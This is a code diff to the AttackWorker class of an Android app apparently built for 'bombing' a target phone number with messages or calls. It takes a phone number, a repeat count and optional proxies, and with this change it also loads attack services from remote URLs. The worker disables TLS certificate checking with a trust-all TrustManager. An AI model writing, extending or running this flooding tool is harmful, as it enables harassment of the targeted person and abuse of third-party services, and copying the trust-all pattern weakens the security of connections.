@@ -1,5 +1,6 @@
 package com.dm.bomber.worker;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -8,11 +9,13 @@ import android.app.PendingIntent;
 import android.app.TaskStackBuilder;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
+import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import androidx.core.app.NotificationManagerCompat;
 import androidx.work.Data;
@@ -20,12 +23,17 @@ import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
 import com.dm.bomber.R;
-import com.dm.bomber.services.Phone;
-import com.dm.bomber.services.Service;
-import com.dm.bomber.services.ServicesRepository;
+import com.dm.bomber.services.DefaultRepository;
+import com.dm.bomber.services.MainServices;
+import com.dm.bomber.services.core.Callback;
+import com.dm.bomber.services.core.Phone;
+import com.dm.bomber.services.core.Service;
+import com.dm.bomber.services.core.ServicesRepository;
+import com.dm.bomber.services.remote.RemoteRepository;
 import com.dm.bomber.ui.MainActivity;
 import com.dm.bomber.ui.MainRepository;
 import com.dm.bomber.ui.MainViewModel;
+import com.dm.bomber.ui.Repository;
 import com.google.firebase.analytics.FirebaseAnalytics;
 
 import org.jetbrains.annotations.NotNull;
@@ -64,6 +72,8 @@ public class AttackWorker extends Worker {
     private int progress = 0;
 
     private CountDownLatch tasks;
+
+    private boolean notificationsGranted = true;
 
     @SuppressLint({"CustomX509TrustManager", "TrustAllX509TrustManager"})
     private final TrustManager[] trustAllCerts = new TrustManager[]{
@@ -108,6 +118,8 @@ public class AttackWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
+        Repository repository = new MainRepository(getApplicationContext());
+
         try {
             SSLContext sslContext = SSLContext.getInstance("SSL");
             sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
@@ -121,7 +133,7 @@ public class AttackWorker extends Worker {
         OkHttpClient client = clientBuilder.build();
 
         List<AuthableProxy> proxies = getInputData().getBoolean(KEY_PROXY_ENABLED, false) ?
-                new MainRepository(getApplicationContext()).getProxy() : new ArrayList<>();
+                repository.getProxy() : new ArrayList<>();
 
         Phone phone = new Phone(
                 getInputData().getString(KEY_COUNTRY_CODE),
@@ -129,7 +141,19 @@ public class AttackWorker extends Worker {
 
         int repeats = getInputData().getInt(KEY_REPEATS, 1);
 
-        List<Service> usableServices = new ServicesRepository().getServices(phone);
+        MainServices services = new MainServices();
+
+        ArrayList<ServicesRepository> repositories = new ArrayList<>();
+
+        if (!repository.isDefaultDisabled()) repositories.add(new DefaultRepository());
+        if (repository.isRemoteServicesEnabled())
+            for (String url : repository.getRemoteServicesUrls())
+                repositories.add(new RemoteRepository(client, url));
+
+        services.setRepositories(repositories);
+        services.collectAll();
+
+        List<Service> usableServices = services.getServices(phone);
 
         Bundle params = new Bundle();
 
@@ -149,6 +173,10 @@ public class AttackWorker extends Worker {
                 .build();
 
         NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());
+
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+            notificationsGranted = ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
+        }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             CharSequence name = getApplicationContext().getString(R.string.attack);
@@ -194,13 +222,14 @@ public class AttackWorker extends Worker {
                     break;
                 }
 
-                service.run(client, new com.dm.bomber.services.Callback() {
+                service.run(client, new Callback() {
                     @Override
                     public void onError(@NotNull Call call, @NotNull Exception e) {
                         Log.e(TAG, "An error occurred during the call " + call, e);
                         tasks.countDown();
                     }
 
+                    @SuppressLint("MissingPermission")
                     @Override
                     public void onResponse(@NotNull Call call, @NotNull Response response) {
                         Intent intent = new Intent(getApplicationContext(), MainActivity.class);
@@ -225,7 +254,8 @@ public class AttackWorker extends Worker {
 
                         notification.flags |= Notification.FLAG_ONGOING_EVENT;
 
-                        notificationManager.notify(getId().hashCode(), notification);
+                        if (notificationsGranted)
+                            notificationManager.notify(getId().hashCode(), notification);
 
                         setProgressAsync(new Data.Builder()
                                 .putInt(MainViewModel.KEY_PROGRESS, progress++)
